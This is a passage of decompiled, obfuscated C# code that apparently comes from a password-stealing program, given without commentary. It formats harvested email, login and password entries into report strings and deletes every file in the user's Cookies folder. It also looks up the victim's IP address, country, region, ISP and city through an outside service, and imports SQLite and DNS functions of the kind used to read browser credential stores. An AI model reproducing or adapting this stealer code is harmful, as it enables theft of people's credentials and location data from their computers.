							goto IL_0008;
						case 3:
							goto IL_0020;
						case 4:
							goto IL_0060;
						case 5:
							goto IL_0074;
						case 6:
							goto IL_008e;
						case 7:
							goto IL_00df;
						default:
							goto end_IL_0000;
						case 8:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_0060:
					num = 4;
					goto IL_0063;
					IL_0008:
					num = 2;
					enumerator = form1_0.class11_0.System_002ECollections_002EGeneric_002EIEnumerable_003Cns1_002EClass18_003E_002EGetEnumerator();
					goto IL_0063;
					IL_0063:
					if (enumerator.MoveNext())
					{
						current = enumerator.Current;
						goto IL_0020;
					}
					enumerator?.Dispose();
					goto IL_0074;
					IL_0020:
					num = 3;
					form1_0.string_54 = "---------------------------------------------\r\nEmail: " + Class34.smethod_126(current) + "\r\nPassword: " + Class34.smethod_145(current) + "\r\n--------------------------------------------- ";
					goto IL_0060;
					IL_00df:
					num = 7;
					goto IL_00e2;
					IL_0074:
					num = 5;
					enumerator2 = form1_0.class10_0.System_002ECollections_002EGeneric_002EIEnumerable_003Cns1_002EClass17_003E_002EGetEnumerator();
					goto IL_00e2;
					IL_00e2:
					if (enumerator2.MoveNext())
					{
						current2 = enumerator2.Current;
						goto IL_008e;
					}
					enumerator2?.Dispose();
					goto end_IL_0000_2;
					IL_008e:
					num = 6;
					form1_0.string_55 = "---------------------------------------------\r\nLogin: " + Class34.smethod_6(current2) + "\r\nPassword: " + Class34.smethod_75(current2) + "\r\nTargetname: " + Class34.smethod_27(current2) + "\r\n--------------------------------------------- ";
					goto IL_00df;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 298;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("dnsapi", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	static extern int DnsQuery_W([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_0, int int_1, int int_2, ref IntPtr intptr_0, int int_3);

	static void smethod_162(Form1 form1_0, bool bool_0)
	{
		if (!bool_0)
		{
			return;
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Cookies);
		if (!Directory.Exists(folderPath))
		{
			return;
		}
		foreach (string file in ((ServerComputer)Class1.smethod_0()).get_FileSystem().GetFiles(folderPath))
		{
			try
			{
				((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(file);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	static void smethod_163(Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		XPathNodeIterator xPathNodeIterator = default(XPathNodeIterator);
		XPathDocument xPathDocument = default(XPathDocument);
		XPathNavigator xPathNavigator = default(XPathNavigator);
		XPathExpression expr = default(XPathExpression);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 515:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0016;
						case 4:
							goto IL_0020;
						case 5:
							goto IL_002f;
						case 6:
							goto IL_003a;
						case 9:
							goto IL_004b;
						case 7:
						case 8:
						case 10:
							goto IL_0080;
						case 11:
							goto IL_008b;
						case 14:
							goto IL_009d;
						case 12:
						case 13:
						case 15:
							goto IL_00d2;
						case 16:
							goto IL_00de;
						case 19:
							goto IL_00f0;
						case 17:
						case 18:
						case 20:
							goto IL_0125;
						case 21:
							goto IL_0131;
						case 24:
							goto IL_0143;
						case 22:
						case 23:
						case 25:
							goto IL_0178;
						default:
							goto end_IL_0000;
						case 26:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_004b:
					num = 9;
					form1_0.vmethod_124().set_Text(form1_0.vmethod_124().get_Text() + "Country                      : " + xPathNodeIterator.Current!.Value + form1_0.string_61);
					goto IL_0080;
					IL_0008:
					num = 2;
					xPathDocument = new XPathDocument("http://ip-address.domaintools.com/myip.xml");
					goto IL_0016;
					IL_0016:
					num = 3;
					xPathNavigator = xPathDocument.CreateNavigator();
					goto IL_0020;
					IL_0020:
					num = 4;
					expr = xPathNavigator.Compile("//ip_address");
					goto IL_002f;
					IL_002f:
					num = 5;
					xPathNodeIterator = xPathNavigator.Select(expr);
					goto IL_003a;
					IL_003a:
					num = 6;
					xPathNodeIterator = xPathNavigator.Select("//country");
					goto IL_0080;
					IL_0080:
					num = 8;
					if (xPathNodeIterator.MoveNext())
					{
						goto IL_004b;
					}
					goto IL_008b;
					IL_008b:
					num = 11;
					xPathNodeIterator = xPathNavigator.Select("//region");
					goto IL_00d2;
					IL_00d2:
					num = 13;
					if (xPathNodeIterator.MoveNext())
					{
						goto IL_009d;
					}
					goto IL_00de;
					IL_00de:
					num = 16;
					xPathNodeIterator = xPathNavigator.Select("//isp");
					goto IL_0125;
					IL_0125:
					num = 18;
					if (xPathNodeIterator.MoveNext())
					{
						goto IL_00f0;
					}
					goto IL_0131;
					IL_0131:
					num = 21;
					xPathNodeIterator = xPathNavigator.Select("//city");
					goto IL_0178;
					IL_0178:
					num = 23;
					if (!xPathNodeIterator.MoveNext())
					{
						goto end_IL_0000_2;
					}
					goto IL_0143;
					IL_0143:
					num = 24;
					form1_0.vmethod_124().set_Text(form1_0.vmethod_124().get_Text() + "City                            : " + xPathNodeIterator.Current!.Value + form1_0.string_61);
					goto IL_0178;
					IL_00f0:
					num = 19;
					form1_0.vmethod_124().set_Text(form1_0.vmethod_124().get_Text() + "Isp                             : " + xPathNodeIterator.Current!.Value + form1_0.string_61);
					goto IL_0125;
					IL_009d:
					num = 14;
					form1_0.vmethod_124().set_Text(form1_0.vmethod_124().get_Text() + "Region                       : " + xPathNodeIterator.Current!.Value + form1_0.string_61);
					goto IL_00d2;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 515;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("sqlite3")]
	static extern int sqlite3_prepare_v2(IntPtr intptr_0, IntPtr intptr_1, int int_0, ref IntPtr intptr_2, ref IntPtr intptr_3);

	static short smethod_164(int int_0)
	{
		return (short)((Class41.Class47.byte_0[int_0 & 0xF] << 12) | (Class41.Class47.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class41.Class47.byte_0[(int_0 >> 8) & 0xF] << 4) | Class41.Class47.byte_0[int_0 >> 12]);
	}
}
